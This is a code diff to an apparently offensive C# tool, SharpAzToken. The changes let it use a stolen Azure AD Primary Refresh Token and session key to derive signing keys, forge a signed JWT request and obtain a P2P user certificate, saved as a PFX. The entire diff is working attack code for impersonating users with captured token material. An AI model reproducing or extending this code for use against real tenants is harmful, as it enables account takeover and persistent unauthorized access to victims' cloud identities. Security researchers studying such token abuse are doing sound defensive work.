@@ -65,20 +65,45 @@ namespace SharpAzToken
         {
             String result = null;
             RSA rsa;
-            if (opts.PRT != null && opts.Context != null && opts.DerivedKey != null && opts.Tenant != null && opts.UserName != null)
+            bool t = (opts.Context != null & opts.DerivedKey != null) | (opts.SessionKey != null);
+            if (opts.PRT != null && ((opts.Context != null & opts.DerivedKey != null)|(opts.SessionKey != null)) && opts.UserName != null)
             {
+                String tenant = null;
+                if(opts.Tenant != null)
+                {
+                    tenant = opts.Tenant;
+                }
+                else
+                {
+                    tenant = Utils.GetTenantIdToUPN(opts.UserName, opts.Proxy);
+                }
                 rsa = new RSACng(2048);
                 string CN = "CN=" + opts.UserName;
                 CertificateRequest req = new System.Security.Cryptography.X509Certificates.CertificateRequest(CN, rsa, System.Security.Cryptography.HashAlgorithmName.SHA256, System.Security.Cryptography.RSASignaturePadding.Pkcs1);
                 var csr = Convert.ToBase64String(req.CreateSigningRequest());
                 string nonce = Helper.GetNonce2(opts.Proxy);
-                
-                var ctx = Helper.Hex2Binary(opts.Context);
-                Dictionary<string, object> headerRaw = new Dictionary<string, object>
-                    { 
+                String derivedSessionKey;
+                Dictionary<string, object> headerRaw;
+                if (opts.Context != null && opts.DerivedKey != null)
+                {
+                    var ctx = Helper.Hex2Binary(opts.Context);
+                    headerRaw = new Dictionary<string, object>
+                    {
                         { "ctx", ctx }
                     };
-
+                    derivedSessionKey = opts.DerivedKey;
+                }
+                else
+                {
+                    var context = Helper.GetByteArray(24);
+                    var decodedKey = Helper.Base64Decode(opts.SessionKey);
+                    var derivedKey = Helper.CreateDerivedKey(decodedKey, context);
+                    derivedSessionKey = Helper.Binary2Hex(derivedKey);
+                    headerRaw = new Dictionary<string, object>
+                    {
+                        { "ctx", context }
+                    };
+                }
                 byte[] data = Helper.Base64Decode(opts.PRT);
                 string prtdecoded = Encoding.UTF8.GetString(data);
 
@@ -90,13 +115,15 @@ namespace SharpAzToken
                     { "request_nonce", nonce },
                     { "scope", "openid aza ugs" },
                     { "refresh_token", prtdecoded },
-                    { "client_id", AzClientIDEnum.WindowsClient },
+                    { "client_id", "38aa3b87-a06d-4817-b275-7a316988d93b"},
                     { "cert_token_use", "user_cert" },
                     { "csr_type", "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" },
-                    { "csr", csr }
+                    { "csr", csr },
+                    { "prt_protocol_version", "3.8"}
                 };
 
-                var JWT = Helper.signJWT(headerRaw, payload, opts.DerivedKey);
+                
+                var JWT = Helper.signJWT(headerRaw, payload, derivedSessionKey);
                 result = Tokenator.GetP2PCertificate(JWT, opts.Tenant, opts.Proxy);
                 
             }
@@ -131,7 +158,7 @@ namespace SharpAzToken
                         { "win_ver", "10.0.18363.0" },
                         { "grant_type", "device_auth" },
                         { "cert_token_use", "device_cert" },
-                        { "client_id", AzClientIDEnum.WindowsClient },
+                        { "client_id", "38aa3b87-a06d-4817-b275-7a316988d93b" },
                         { "csr_type", "http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10" },
                         { "csr",  csr },
                         { "netbios_name", "JuniTest" },
@@ -152,7 +179,7 @@ namespace SharpAzToken
             }
             else 
             {
-                Console.WriteLine("[-] Use --prt --derivedkey --context --tenant --username or with --pfxpath --tenant --devicename.... Other methods are not implemented yet...");
+                Console.WriteLine("[-] Use --prt ((--derivedkey --context) or (--sessionkey)) --username or with --pfxpath --tenant --devicename.... Other methods are not implemented yet...");
                 return 1;
             }
 
@@ -166,7 +193,7 @@ namespace SharpAzToken
                 string deviceId = cert.Subject.Split("=")[1];
                 deviceId = deviceId.Split(",")[0];
                 var keyPair = cert.CopyWithPrivateKey(rsa);
-                byte[] certData = keyPair.Export(X509ContentType.Pfx, "");
+                byte[] certData = keyPair.Export(X509ContentType.Pfx, opts.PFXPassword);
                 File.WriteAllBytes(deviceId + "-P2P.pfx", certData);
 
                 String certHeader = "-----BEGIN PUBLIC KEY-----\n";
